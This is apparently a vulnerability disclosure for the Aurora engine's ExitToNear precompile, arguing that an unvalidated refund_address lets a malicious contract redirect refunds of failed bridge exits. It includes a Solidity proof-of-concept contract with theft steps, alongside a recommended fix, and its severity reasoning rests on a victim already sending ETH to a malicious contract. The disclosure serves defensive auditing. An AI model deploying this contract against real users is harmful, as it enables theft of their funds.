### Title
Unvalidated Caller-Supplied `refund_address` in `ExitToNear` Precompile Enables Theft of User Funds via Engineered Exit Failure - (File: engine-precompiles/src/native.rs)

### Summary

When the `error_refund` feature is compiled in, the `ExitToNear` precompile at `0xe9217bc70b7ed1f598ddd3199e80b093fa71124f` accepts bytes 1–20 of its input as an arbitrary `refund_address` without validating that it matches `context.caller`. If the downstream NEAR `ft_transfer` or `ft_transfer_call` promise fails, `exit_to_near_precompile_callback` invokes `refund_on_error`, which transfers the user's ETH (or re-mints burned ERC-20 tokens) to that unvalidated address. A malicious EVM contract can exploit this to redirect the refund to an attacker-controlled address, stealing the user's funds.

### Finding Description

**Root cause — `parse_input` extracts `refund_address` from raw calldata with no origin check:** [1](#0-0) 

The parsed `refund_address` is stored verbatim in `BaseTokenParams` or `Erc20TokenParams`: [2](#0-1) 

It is then forwarded into `RefundCallArgs` by `refund_call_args()`, which always uses the caller-supplied value with no comparison against `context.caller`: [3](#0-2) 

The `ExitToNearPrecompileCallbackArgs` carrying this address is serialised into the callback promise: [4](#0-3) 

When the NEAR-side promise fails, `exit_to_near_precompile_callback` calls `engine::refund_on_error` with the attacker-supplied `recipient_address`: [5](#0-4) 

`refund_on_error` then transfers ETH from the precompile's EVM balance directly to that address, or re-mints burned ERC-20 tokens to it: [6](#0-5) 

**Contrast with the ERC-20 exit path**, which correctly rejects any non-zero `apparent_value` to prevent funds being locked: [7](#0-6) 

No equivalent guard exists for the base-token (ETH) path to validate `refund_address`.

### Impact Explanation

**Critical — direct theft of user ETH or ERC-20 tokens.**

A malicious EVM contract can:
1. Accept a user's ETH (or trigger an ERC-20 burn on their behalf).
2. Call `ExitToNear` with `refund_address` set to an attacker-controlled EVM address and `recipient_account_id` set to an unregistered NEAR account (guaranteed to fail).
3. The ETH is deducted from the user and credited to the precompile's EVM balance.
4. The NEAR `ft_transfer` fails because the recipient is unregistered.
5. `exit_to_near_precompile_callback` fires and `refund_on_error` transfers the ETH from the precompile to the attacker's address — not back to the user.

The user loses their entire deposited ETH (or ERC-20 tokens). The amount at risk is bounded only by the user's balance and the gas limit.

### Likelihood Explanation

**Medium.** The `error_refund` feature must be compiled in (it is an optional Cargo feature, but the existence of production tests gated on it — `test_exit_to_near_eth_refund`, `test_exit_to_near_refund` — indicates it is intended for production use). [8](#0-7) 

The attack requires a user to interact with a malicious EVM contract, which is a standard and realistic DeFi threat model (phishing, fake bridge UI, malicious aggregator). No privileged access is needed; any EVM contract deployer can execute this.

### Recommendation

Validate that `refund_address` equals `context.caller` inside `ExitToNear::run` before constructing `RefundCallArgs`. If the caller is a contract that legitimately needs a different refund destination, require it to be explicitly whitelisted or passed through a separate authenticated channel. At minimum, add the check:

```rust
#[cfg(feature = "error_refund")]
if refund_address != Address::new(context.caller) {
    return Err(ExitError::Other(Cow::from("ERR_INVALID_REFUND_ADDRESS")));
}
```

This mirrors the existing guard on the ERC-20 path that rejects non-zero `apparent_value`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IExitToNear {
    // flag(1) | refund_address(20) | recipient_near_account_id(N)
    fallback() external payable;
}

contract MaliciousExit {
    address constant EXIT_TO_NEAR = 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f;
    address immutable attacker;

    constructor(address _attacker) { attacker = _attacker; }

    // User calls this with ETH they want to bridge
    function exit(string calldata nearAccount) external payable {
        // Build input: flag=0x00 | refund_address=attacker | nearAccount bytes
        bytes memory input = abi.encodePacked(
            uint8(0x00),          // flag: ETH base token
            attacker,             // refund_address — attacker-controlled
            bytes(nearAccount)    // use an unregistered NEAR account to force failure
        );
        (bool ok,) = EXIT_TO_NEAR.call{value: msg.value}(input);
        require(ok);
        // ft_transfer to unregistered account fails on NEAR side →
        // exit_to_near_precompile_callback fires →
        // refund_on_error sends ETH to `attacker`, not msg.sender
    }
}
```

Steps:
1. Attacker deploys `MaliciousExit` with their own EVM address as `attacker`.
2. Victim calls `MaliciousExit.exit{value: 1 ether}("unregistered.near")`.
3. 1 ETH moves from victim → precompile EVM balance.
4. NEAR `ft_transfer` to `unregistered.near` fails (account not registered).
5. Callback fires; `refund_on_error` sends 1 ETH from precompile → `attacker`.
6. Victim loses 1 ETH; attacker gains 1 ETH.

### Citations

**File:** engine-precompiles/src/native.rs (L449-483)
```rust
        let callback_args = ExitToNearPrecompileCallbackArgs {
            #[cfg(feature = "error_refund")]
            refund: refund_call_args(&exit_to_near_params, &exit_event),
            #[cfg(not(feature = "error_refund"))]
            refund: None,
            transfer_near: transfer_near_args,
        };
        let attached_gas = if method == "ft_transfer_call" {
            costs::FT_TRANSFER_CALL_GAS
        } else {
            costs::FT_TRANSFER_GAS
        };

        let transfer_promise = PromiseCreateArgs {
            target_account_id: nep141_address,
            method,
            args: args.into_bytes(),
            attached_balance: Yocto::new(1),
            attached_gas,
        };

        let promise = if callback_args == ExitToNearPrecompileCallbackArgs::default() {
            PromiseArgs::Create(transfer_promise)
        } else {
            PromiseArgs::Callback(PromiseWithCallbackArgs {
                base: transfer_promise,
                callback: PromiseCreateArgs {
                    target_account_id: self.current_account_id.clone(),
                    method: "exit_to_near_precompile_callback".to_string(),
                    args: borsh::to_vec(&callback_args).unwrap(),
                    attached_balance: Yocto::new(0),
                    attached_gas: costs::EXIT_TO_NEAR_CALLBACK_GAS,
                },
            })
        };
```

**File:** engine-precompiles/src/native.rs (L572-580)
```rust
    // In case of withdrawing ERC-20 tokens, the `apparent_value` should be zero. In opposite way
    // the funds will be locked in the address of the precompile without any possibility
    // to withdraw them in the future. So, in case if the `apparent_value` is not zero, the error
    // will be returned to prevent that.
    if context.apparent_value != U256::zero() {
        return Err(ExitError::Other(Cow::from(
            "ERR_ETH_ATTACHED_FOR_ERC20_EXIT",
        )));
    }
```

**File:** engine-precompiles/src/native.rs (L682-697)
```rust
#[cfg_attr(test, derive(Debug, PartialEq))]
struct BaseTokenParams<'a> {
    #[cfg(feature = "error_refund")]
    refund_address: Address,
    receiver_account_id: AccountId,
    message: Option<Message<'a>>,
}

#[cfg_attr(test, derive(Debug, PartialEq))]
struct Erc20TokenParams<'a> {
    #[cfg(feature = "error_refund")]
    refund_address: Address,
    receiver_account_id: AccountId,
    amount: U256,
    message: Option<Message<'a>>,
}
```

**File:** engine-precompiles/src/native.rs (L699-725)
```rust
#[cfg(feature = "error_refund")]
#[allow(clippy::unnecessary_wraps)]
fn refund_call_args(
    params: &ExitToNearParams,
    event: &events::ExitToNear,
) -> Option<RefundCallArgs> {
    Some(RefundCallArgs {
        recipient_address: match params {
            ExitToNearParams::BaseToken(params) => params.refund_address,
            ExitToNearParams::Erc20TokenParams(params) => params.refund_address,
        },
        erc20_address: match params {
            ExitToNearParams::BaseToken(_) => None,
            ExitToNearParams::Erc20TokenParams(_) => {
                let erc20_address = match event {
                    events::ExitToNear::Legacy(legacy) => legacy.erc20_address,
                    events::ExitToNear::Omni(omni) => omni.erc20_address,
                };
                Some(erc20_address)
            }
        },
        amount: types::u256_to_arr(&match event {
            events::ExitToNear::Legacy(legacy) => legacy.amount,
            events::ExitToNear::Omni(omni) => omni.amount,
        }),
    })
}
```

**File:** engine-precompiles/src/native.rs (L778-785)
```rust
#[cfg(feature = "error_refund")]
fn parse_input(input: &[u8]) -> Result<(Address, &[u8]), ExitError> {
    validate_input_size(input, MIN_INPUT_SIZE, MAX_INPUT_SIZE)?;
    let mut buffer = [0; 20];
    buffer.copy_from_slice(&input[1..21]);
    let refund_address = Address::from_array(buffer);
    Ok((refund_address, &input[21..]))
}
```

**File:** engine/src/contract_methods/connector.rs (L231-239)
```rust
        } else if let Some(args) = args.refund {
            // Exit call failed; need to refund tokens
            let refund_result = engine::refund_on_error(io, env, state, &args, handler)?;

            if !refund_result.status.is_ok() {
                return Err(errors::ERR_REFUND_FAILURE.into());
            }

            Some(refund_result)
```

**File:** engine/src/engine.rs (L1204-1224)
```rust
    } else {
        // ETH exit; transfer ETH back from precompile address
        let exit_address = exit_to_near::ADDRESS;
        let mut engine: Engine<_, _> =
            Engine::new_with_state(state, exit_address, current_account_id, io, env);
        let refund_address = args.recipient_address;
        let amount = Wei::new(U256::from_big_endian(&args.amount));
        engine.call(
            &exit_address,
            &refund_address,
            amount,
            Vec::new(),
            u64::MAX,
            vec![
                (exit_address.raw(), Vec::new()),
                (refund_address.raw(), Vec::new()),
            ],
            Vec::new(),
            handler,
        )
    }
```

**File:** engine-tests/src/tests/erc20_connector.rs (L717-781)
```rust
    #[tokio::test]
    async fn test_exit_to_near_eth_refund() {
        // Test the case where the ft_transfer promise from the exit call fails;
        // ensure ETH is refunded.

        let TestExitToNearEthContext {
            signer,
            signer_address,
            chain_id,
            tester_address,
            aurora,
        } = test_exit_to_near_eth_common().await.unwrap();
        let exit_account_id = "any.near";

        // Make the ft_transfer call fail by draining the Aurora account
        let result = aurora
            .ft_transfer(
                &"tmp.near".parse().unwrap(),
                u128::from(INITIAL_ETH_BALANCE).into(),
                &None,
            )
            .max_gas()
            .deposit(NearToken::from_yoctonear(1))
            .transact()
            .await
            .unwrap();
        assert!(result.is_success());

        // call exit to near
        let input = build_input(
            "withdrawEthToNear(bytes)",
            &[ethabi::Token::Bytes(exit_account_id.as_bytes().to_vec())],
        );
        let tx = utils::create_eth_transaction(
            Some(tester_address),
            Wei::new_u64(ETH_EXIT_AMOUNT),
            input,
            Some(chain_id),
            &signer.secret_key,
        );
        let result = aurora
            .submit(rlp::encode(&tx).to_vec())
            .max_gas()
            .transact()
            .await
            .unwrap();
        assert!(result.is_success());

        // check balances
        assert_eq!(
            nep_141_balance_of(aurora.as_raw_contract(), &exit_account_id.parse().unwrap()).await,
            0
        );

        #[cfg(feature = "error_refund")]
        let expected_balance = Wei::new_u64(INITIAL_ETH_BALANCE);
        // If the refund feature is not enabled, then there is no refund in the EVM
        #[cfg(not(feature = "error_refund"))]
        let expected_balance = Wei::new_u64(INITIAL_ETH_BALANCE - ETH_EXIT_AMOUNT);

        assert_eq!(
            eth_balance_of(signer_address, &aurora).await,
            expected_balance
        );
    }
```
